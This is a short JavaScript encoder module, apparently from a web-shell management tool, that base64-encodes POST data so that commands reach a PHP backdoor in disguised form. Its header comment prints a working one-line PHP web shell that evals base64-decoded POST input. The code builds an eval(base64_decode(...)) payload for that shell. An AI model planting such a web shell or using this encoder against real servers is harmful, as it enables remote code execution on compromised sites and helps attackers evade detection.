/**
 * php::b64pass编码器
 * Create at: 2018/10/11 21:40:45
 *
 * 把所有 POST 参数都进行了 base64 编码
 *
 * 适用shell: 
 *
 * <?php @eval(base64_decode($_POST['ant']));?>
 * 
 */

'use strict';

module.exports = (pwd, data) => {
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = new Buffer(data['_']).toString('base64');
  data[pwd] = new Buffer(`eval(base64_decode($_POST[${randomID}]));die();`).toString('base64');
  delete data['_'];
  return data;
}